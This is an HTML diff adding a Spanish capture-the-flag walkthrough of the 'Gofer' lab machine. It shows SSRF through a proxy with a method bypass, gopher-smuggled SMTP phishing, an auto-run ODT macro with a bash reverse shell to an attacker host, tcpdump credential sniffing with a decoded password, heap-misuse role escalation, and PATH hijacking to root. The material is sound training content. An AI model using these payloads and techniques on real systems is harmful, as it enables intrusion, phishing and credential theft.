+
+                <p>Este correo revela varios datos críticos de información:</p>
+                <ul>
+                    <li><strong>Jocelyn (jhudson)</strong> es susceptible a ataques de phishing y tiende a hacer clic en enlaces sin examinar cuidadosamente</li>
+                    <li><strong>Tom (tbuckley)</strong> es el desarrollador del virtual host del proxy en <code>proxy.gofer.htb</code></li>
+                    <li>El proxy podría estar incorrectamente asegurado usando solo la directiva <code>&lt;Limit&gt;</code> de Apache, potencialmente permitiendo bypasses de métodos HTTP</li>
+                    <li>La organización prefiere el formato de archivo <code>.odt</code> (LibreOffice) sobre formatos de Microsoft Office</li>
+                </ul>
+
+                <h2>Explotando el Proxy - Bypass de Método HTTP</h2>
+                <p>La mención del correo sobre <code>&lt;Limit&gt;</code> sugiere que el proxy podría restringir únicamente ciertos métodos HTTP como GET. Pruebo esta hipótesis usando <code>feroxbuster</code> con múltiples métodos HTTP:</p>
+                <pre><code class="language-bash">feroxbuster --url http://proxy.gofer.htb \
+  -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt \
+  -t 200 -x html,php -m GET,POST,PUT,OPTIONS,CONNECT</code></pre>
+
+                <p>Los resultados confirman el bypass:</p>
+                <pre><code class="language-plaintext">200 POST    2l   10w   81c http://proxy.gofer.htb/index.php
+200 PUT     2l   10w   81c http://proxy.gofer.htb/index.php
+200 OPTIONS 2l   10w   81c http://proxy.gofer.htb/index.php</code></pre>
+
+                <p>Mientras que las peticiones GET requieren autenticación, ¡los métodos POST, PUT y OPTIONS funcionan sin credenciales! Probando con POST:</p>
+                <pre><code class="language-bash">curl -X POST http://proxy.gofer.htb/index.php</code></pre>
+
+                <p>Respuesta:</p>
+                <pre><code class="language-html">&lt;!-- Welcome to Gofer proxy --&gt;
+&lt;html&gt;&lt;body&gt;Missing URL parameter !&lt;/body&gt;&lt;/html&gt;</code></pre>
+
+                <p>El proxy espera un parámetro URL. Como está diseñado como un servicio de proxy, pruebo con una URL objetivo:</p>
+                <pre><code class="language-bash">curl -X POST "http://proxy.gofer.htb/index.php?url=http://gofer.htb"</code></pre>
+
+                <p>¡Éxito! El proxy obtiene y devuelve el contenido de <code>gofer.htb</code>. Esta es una vulnerabilidad clásica de Server-Side Request Forgery (SSRF).</p>
+
+                <h3>Probando Limitaciones SSRF</h3>
+                <p>Intento apuntar a servicios internos, pero descubro que hay filtrado implementado:</p>
+                <pre><code class="language-bash">curl -X POST "http://proxy.gofer.htb/index.php?url=http://localhost"</code></pre>
+                <pre><code class="language-html">&lt;html&gt;&lt;body&gt;Blacklisted keyword: localhost !&lt;/body&gt;&lt;/html&gt;</code></pre>
+
+                <pre><code class="language-bash">curl -X POST "http://proxy.gofer.htb/index.php?url=http://127.0.0.1"</code></pre>
+                <pre><code class="language-html">&lt;html&gt;&lt;body&gt;Blacklisted keyword: /127 !&lt;/body&gt;&lt;/html&gt;</code></pre>
+
+                <p>Sin embargo, el filtro puede bypassearse usando <code>0.0.0.0</code>:</p>
+                <pre><code class="language-bash">curl -X POST "http://proxy.gofer.htb/index.php?url=http://0.0.0.0"</code></pre>
+
+                <p>Esto funciona y devuelve contenido de la máquina local.</p>
+
+                <h2>Abuso del Protocolo Gopher - Interacción SMTP</h2>
+                <p>Para aprovechar esta vulnerabilidad SSRF para phishing, necesito interactuar con el servicio SMTP interno en el puerto 25. El <strong>protocolo Gopher</strong> es perfecto para esto, ya que permite enviar datos arbitrarios a servicios TCP.</p>
+
+                <p>Probando acceso Gopher a SMTP:</p>
+                <pre><code class="language-bash">curl -X POST "http://proxy.gofer.htb/index.php?url=gopher://gofer.htb:25/_QUIT%250d%250a"</code></pre>
+
+                <p>Respuesta:</p>
+                <pre><code class="language-plaintext">&lt;!-- Welcome to Gofer proxy --&gt;
+220 gofer.htb ESMTP Postfix (Debian/GNU)
+221 2.0.0 Bye</code></pre>
+
+                <p>¡Excelente! Puedo interactuar con el servicio SMTP. Ahora creo un correo de phishing usando sintaxis SMTP apropiada. Según las especificaciones del protocolo SMTP, una transacción completa de correo requiere:</p>
+                <ul>
+                    <li><code>HELO</code> - Iniciar conexión</li>
+                    <li><code>MAIL FROM</code> - Especificar remitente</li>
+                    <li><code>RCPT TO</code> - Especificar destinatario</li>
+                    <li><code>DATA</code> - Comenzar contenido del mensaje</li>
+                    <li>Encabezados y cuerpo del mensaje</li>
+                    <li><code>.</code> - Fin del mensaje (un solo punto en una línea)</li>
+                    <li><code>QUIT</code> - Cerrar conexión</li>
+                </ul>
+
+                <h3>Probando Entrega de Correo</h3>
+                <p>Primero, pruebo con un simple callback HTTP para confirmar que Jocelyn hará clic en enlaces:</p>
+                <pre><code class="language-plaintext">HELO xd
+MAIL FROM:xd@gofer.htb
+RCPT TO:jhudson@gofer.htb
+DATA
+Subject: Please click immediately!
+Message: Hello Jocelyn,
+
+Please visit the following ASAP! http://10.10.16.2
+
+.
+QUIT</code></pre>
+
+                <p>Codificando esto en URL para el payload Gopher (CRLF = <code>%250d%250a</code>):</p>
+                <pre><code class="language-bash">curl -X POST 'http://proxy.gofer.htb/index.php?url=gopher://gofer.htb:25/_HELO%20xd%250d%250aMAIL%20FROM:xd@gofer.htb%250d%250aRCPT%20TO:jhudson@gofer.htb%250d%250aDATA%250d%250aSubject:%20Please%20click%20immediately!%250d%250aMessage:%20Hello%20Jocelyn,%250d%250aPlease%20visit%20the%20following%20ASAP!%20http://10.10.16.2%250d%250a.%250d%250aQUIT'</code></pre>
+
+                <p>El servidor SMTP confirma que el correo fue encolado:</p>
+                <pre><code class="language-plaintext">220 gofer.htb ESMTP Postfix (Debian/GNU)
+250 gofer.htb
+250 2.1.0 Ok
+250 2.1.5 Ok
+354 End data with &lt;CR&gt;&lt;LF&gt;.&lt;CR&gt;&lt;LF&gt;
+250 2.0.0 Ok: queued as C48928150
+221 2.0.0 Bye</code></pre>
+
+                <p>Poco después, mi servidor HTTP recibe una petición del objetivo, confirmando que Jocelyn hizo clic en el enlace:</p>
+                <pre><code class="language-plaintext">Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+10.10.11.225 - - "GET /xd HTTP/1.1" 404 -</code></pre>
+
+                <h2>Acceso Inicial - Macro ODT Maliciosa</h2>
+                <p>Con el éxito del phishing confirmado, ahora creo un documento <code>.odt</code> malicioso de LibreOffice que contiene un payload de reverse shell basado en macros.</p>
+
+                <h3>Creando el Payload de Macro</h3>
+                <p>En LibreOffice Writer, navego a <strong>Herramientas → Macros → Organizar Macros → Basic...</strong> y creo una nueva macro para mi documento:</p>
+                <p><img src="./media/image3.png" alt="Editor de macros LibreOffice Basic mostrando un payload de reverse shell usando la función Shell() para ejecutar bash -c con un comando de reverse shell codificado en base64" /></p>
+
+                <p>La macro contiene un comando simple de reverse shell que se conectará de vuelta a mi máquina atacante:</p>
+                <pre><code class="language-vbscript">Sub Main
+    Shell("bash -c 'bash -i >& /dev/tcp/10.10.16.2/443 0>&1'")
+End Sub</code></pre>
+
+                <p>A continuación, configuro la macro para ejecutarse automáticamente cuando se abra el documento. En <strong>Herramientas → Personalizar...</strong>, bajo la pestaña <strong>Eventos</strong>, asigno la macro al evento <strong>Abrir documento</strong>:</p>
+                <p><img src="./media/image4.png" alt="Diálogo Personalizar de LibreOffice mostrando la pestaña Eventos con el evento Abrir documento configurado para ejecutar la macro maliciosa" /></p>
+
+                <p>Guardo el documento como <code>xd.odt</code> y preparo mi infraestructura de ataque.</p>
+
+                <h3>Entregando el Payload</h3>
+                <p>Configurando listeners y el servidor HTTP para alojar el documento malicioso:</p>
+                <pre><code class="language-bash">sudo nc -lvnp 443</code></pre>
+                <pre><code class="language-bash">sudo python3 -m http.server 80</code></pre>
+
+                <p>Enviando el correo de phishing con el enlace al documento malicioso:</p>
+                <pre><code class="language-bash">curl -X POST 'http://proxy.gofer.htb/index.php?url=gopher://gofer.htb:25/_HELO%20xd%250d%250aMAIL%20FROM:xd@gofer.htb%250d%250aRCPT%20TO:jhudson@gofer.htb%250d%250aDATA%250d%250aSubject:%20Please%20click%20immediately!%250d%250aMessage:%20Hello%20Jocelyn,%250d%250aPlease%20visit%20the%20following%20ASAP!%20http://10.10.16.2/xd.odt%250d%250a.%250d%250aQUIT'</code></pre>
+
+                <p>El correo es encolado exitosamente. Poco después, Jocelyn descarga el documento malicioso:</p>
+                <pre><code class="language-plaintext">Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+10.10.11.225 - - "GET /xd.odt HTTP/1.1" 200 -</code></pre>
+
+                <p>Y la reverse shell se conecta de vuelta como usuario <code>jhudson</code>:</p>
+                <pre><code class="language-bash">listening on [any] 443 ...
+connect to [10.10.16.2] from (UNKNOWN) [10.10.11.225] 47592
+bash: cannot set terminal process group (88261): Inappropriate ioctl for device
+bash: no job control in this shell
+bash: /home/jhudson/.bashrc: Permission denied
+jhudson@gofer:~$</code></pre>
+
+                <p>Ahora tengo acceso inicial como <code>jhudson</code> y puedo recuperar la flag de usuario.</p>
+
+                <h2>Enumeración Post-Explotación</h2>
+                <p>Tras obtener el acceso inicial, comienzo enumerando el sistema en busca de vectores de escalada de privilegios. Descubro un binario SUID inusual:</p>
+                <pre><code class="language-bash">find / -perm -4000 2>/dev/null</code></pre>
+                <pre><code class="language-plaintext">/usr/local/bin/notes</code></pre>
+
+                <p>Sin embargo, aún no tengo permiso para ejecutarlo:</p>
+                <pre><code class="language-bash">ls -la /usr/local/bin/notes</code></pre>
+                <pre><code class="language-plaintext">-rwsr-s--- 1 root dev 17168 Apr 28 2023 /usr/local/bin/notes</code></pre>
+
+                <p>El binario pertenece al grupo <code>dev</code>. Comprobando mis grupos actuales:</p>
+                <pre><code class="language-bash">id</code></pre>
+                <pre><code class="language-plaintext">uid=1000(jhudson) gid=1000(jhudson) groups=1000(jhudson),108(netdev)</code></pre>
+
+                <p>Estoy en el grupo <code>netdev</code>, lo cual es interesante. Comprobando otros usuarios en el sistema:</p>
+                <pre><code class="language-bash">ls -la /home</code></pre>
+                <pre><code class="language-plaintext">drwxr-xr-x 2 ablake ablake 4096 Jul 19 2023 ablake
+drwxr-xr-x 2 jdavis jdavis 4096 Jul 19 2023 jdavis
+drwxr-xr-x 6 jhudson jhudson 4096 Jul 26 2023 jhudson
+drwxr-xr-x 3 tbuckley tbuckley 4096 Jul 19 2023 tbuckley</code></pre>
+
+                <p>El usuario <code>tbuckley</code> podría estar en el grupo <code>dev</code>:</p>
+                <pre><code class="language-bash">id tbuckley</code></pre>
+                <pre><code class="language-plaintext">uid=1002(tbuckley) gid=1002(tbuckley) groups=1002(tbuckley),1004(dev)</code></pre>
+
+                <p>¡Confirmado! Necesito moverme lateralmente a <code>tbuckley</code> para interactuar con el binario <code>notes</code>.</p>
+
+                <h2>Movimiento Lateral - Sniffing de Paquetes con tcpdump</h2>
+                <p>La pertenencia al grupo <code>netdev</code> es significativa. Compruebo binarios con capabilities especiales, aunque <code>getcap</code> no está en el PATH por defecto para usuarios no root en Debian:</p>
+                <pre><code class="language-bash">find / -name "*getcap*" 2>/dev/null</code></pre>
+                <pre><code class="language-plaintext">/usr/sbin/getcap
+/usr/share/man/man8/getcap.8.gz</code></pre>
+
+                <p>Ejecutando <code>getcap</code> con la ruta completa:</p>
+                <pre><code class="language-bash">/usr/sbin/getcap -r / 2>/dev/null</code></pre>
+                <pre><code class="language-plaintext">/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper cap_net_bind_service,cap_net_admin=ep
+/usr/bin/ping cap_net_raw=ep
+/usr/bin/tcpdump cap_net_admin,cap_net_raw=eip</code></pre>
+
+                <p>¡Perfecto! <code>tcpdump</code> tiene las capabilities <code>cap_net_admin</code> y <code>cap_net_raw</code>, permitiendo a cualquier usuario capturar tráfico de red. Este es un objetivo principal para sniffing de credenciales.</p>
+
+                <h3>Capturando Tráfico HTTP</h3>
+                <p>Comienzo capturando tráfico, filtrando mi propia conexión y enfocándome en TCP:</p>
+                <pre><code class="language-bash">tcpdump -i any -nqt not host 10.10.16.2 and tcp</code></pre>
+
+                <p>Esto muestra algo de tráfico, pero necesito ver el contenido real de los paquetes. Refino la captura para mostrar peticiones HTTP GET con salida ASCII:</p>
+                <pre><code class="language-bash">tcpdump -i any -nn -A 'tcp port 80 and (tcp[((tcp[12:1] & 0xF0) >> 2):4] = 0x47455420)'</code></pre>
+
+                <p>Este filtro BPF captura específicamente peticiones HTTP GET (0x47455420 = "GET " en hexadecimal). Tras una breve espera, capturo tráfico interesante:</p>
+                <pre><code class="language-plaintext">19:02:01.106397 lo In IP 127.0.0.1.36924 > 127.0.0.1.80: Flags [P.], seq 290690002:290690165, ack 3882088699, win 512, options [nop,nop,TS val 1343953880 ecr 1343953880], length 163: HTTP: GET /?url=http://gofer.htb HTTP/1.1
+
+GET /?url=http://gofer.htb HTTP/1.1
+Host: proxy.gofer.htb
+Authorization: Basic dGJ1Y2tsZXk6b29QNGRpZXRpZTNvX2hxdWFldGk=
+User-Agent: curl/7.74.0
+Accept: */*</code></pre>
+
+                <p>¡Excelente! He capturado un header HTTP Authorization con credenciales de autenticación Basic. Decodificando la cadena base64:</p>
+                <pre><code class="language-bash">echo "dGJ1Y2tsZXk6b29QNGRpZXRpZTNvX2hxdWFldGk=" | base64 -d</code></pre>
+                <pre><code class="language-plaintext">tbuckley:ooP4dietie3o_hquaeti</code></pre>
+
+                <p>¡Estas credenciales son válidas! Ahora puedo cambiar al usuario <code>tbuckley</code>:</p>
+                <pre><code class="language-bash">su tbuckley</code></pre>
+
+                <h2>Explotación de Binario - Desbordamiento de Búfer en notes</h2>
+                <p>Como <code>tbuckley</code>, ahora puedo ejecutar el binario SUID <code>notes</code>:</p>
+                <pre><code class="language-bash">/usr/local/bin/notes</code></pre>
+                <pre><code class="language-plaintext">========================================
+1) Create an user and choose an username
+2) Show user information
+3) Delete an user
+4) Write a note
+5) Show a note
+6) Save a note (not yet implemented)
+7) Delete a note
+8) Backup notes
+9) Quit
+========================================
+
+Your choice:</code></pre>
+
+                <p>El programa parece ser una aplicación simple para tomar notas. La opción 8 (Backup notes) es particularmente interesante:</p>
+                <pre><code class="language-plaintext">Your choice: 8
+Access denied: you don't have the admin role!</code></pre>
+
+                <p>Para analizar este binario más a fondo, lo transfiero a mi máquina local para ingeniería inversa con Ghidra.</p>
+
+                <h3>Analizando con Ghidra</h3>
+                <p>Tras descompilar el binario en Ghidra, encuentro el código relevante para la opción 8:</p>
+                <pre><code class="language-c">case 8:
+    if (local_10 == (void *)0x0) {
+        puts("First create an user!\n");
+    }
+    else {
+        iVar2 = strcmp((char *)((long)local_10 + 0x18),"admin");
+        if (iVar2 == 0) {
+            puts("Access granted!");
+            setuid(0);
+            setgid(0);
+            system("tar -czvf /root/backups/backup_notes.tar.gz /opt/notes");
+        }
+        else {
+            puts("Access denied: you don't have the admin role!\n");
+        }
+    }
+</code></pre>
+
+                <p>La función de backup comprueba si el rol del usuario (en el desplazamiento <code>local_10 + 0x18</code>) es igual a "admin". Si es así, establece UID y GID a 0 (root) y ejecuta un comando <code>tar</code>.</p>
+
+                <p>Más importante aún, noto algo sospechoso: cuando borro un usuario (opción 3), el nombre de usuario se borra pero la memoria no se sanea apropiadamente. Cuando luego creo una nota (opción 4), el contenido de la nota podría desbordar hacia el campo de rol.</p>
+
+                <h3>Explotando el Desbordamiento de Búfer</h3>
+                <p>Para determinar el desplazamiento exacto donde termina el nombre de usuario y comienza el rol, uso el generador de patrones de Metasploit:</p>
+                <pre><code class="language-bash">msf-pattern_create -l 30</code></pre>
+                <pre><code class="language-plaintext">Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9</code></pre>
+
+                <p>Probando el desbordamiento:</p>
+                <ol>
+                    <li>Crear un usuario</li>
+                    <li>Borrar el usuario</li>
+                    <li>Escribir una nota con el patrón: <code>Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9</code></li>
+                    <li>Mostrar información del usuario</li>
+                </ol>
+
+                <pre><code class="language-plaintext">Your choice: 5
+Note: Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9
+
+Your choice: 2
+Username: Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9
+Role: Aa8Aa9</code></pre>
+
+                <p>¡Perfecto! El campo de rol comienza en el desplazamiento 24. Ahora puedo crear una nota que coloque "admin" exactamente en el campo de rol:</p>
+                <pre><code class="language-plaintext">Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7admin</code></pre>
+
+                <p>Siguiendo el mismo proceso (crear usuario, borrar usuario, escribir nota con payload diseñado):</p>
+                <pre><code class="language-plaintext">Your choice: 2
+Username: Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7admin
+Role: admin</code></pre>
+
+                <p>Ahora puedo acceder a la opción 8:</p>
+                <pre><code class="language-plaintext">Your choice: 8
+Access granted!
+tar: Removing leading `/' from member names
+/opt/notes/</code></pre>
+
+                <h2>Escalada de Privilegios - Secuestro de PATH</h2>
+                <p>La función de backup se ejecuta exitosamente, pero más importante aún, noto que llama a <code>tar</code> sin una ruta absoluta:</p>
+                <pre><code class="language-c">system("tar -czvf /root/backups/backup_notes.tar.gz /opt/notes");</code></pre>
+
+                <p>Como el binario se ejecuta con <code>setuid(0)</code> y no sanea el entorno, puedo explotar esto mediante secuestro de PATH. A diferencia de <code>sudo</code>, que resetea el entorno por defecto, este binario SUID preserva el PATH del usuario.</p>
+
+                <h3>Ejecutando el Secuestro de PATH</h3>
+                <p>Primero, modifico mi PATH para priorizar el directorio actual:</p>
+                <pre><code class="language-bash">export PATH=.:$PATH
+echo $PATH</code></pre>
+                <pre><code class="language-plaintext">.:/tmp:/usr/bin:/bin</code></pre>
+
+                <p>Creando un script <code>tar</code> malicioso en mi directorio de trabajo (<code>/tmp</code>):</p>
+                <pre><code class="language-bash">cat > /tmp/tar << 'EOF'
+#!/bin/bash
+bash -i
+EOF
+chmod +x /tmp/tar</code></pre>
+
+                <p>Ahora vuelvo al binario <code>notes</code> y repito el proceso de explotación:</p>
+                <ol>
+                    <li>Crear un usuario</li>
+                    <li>Borrar el usuario</li>
+                    <li>Escribir una nota: <code>Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7admin</code></li>
+                    <li>Seleccionar opción 8 (Backup notes)</li>
+                </ol>
+
+                <pre><code class="language-plaintext">Your choice: 8
+Access granted!
+root@gofer:/tmp#</code></pre>
+
+                <p>¡Éxito! El binario ejecuta mi script <code>tar</code> malicioso en lugar del <code>tar</code> del sistema, otorgándome una shell root. Ahora puedo recuperar la flag de root y completar la máquina.</p>
+            </div>
+        </article>
+    </main>
+    <script src="../../index.js"></script>
+</body>
+
+</html>
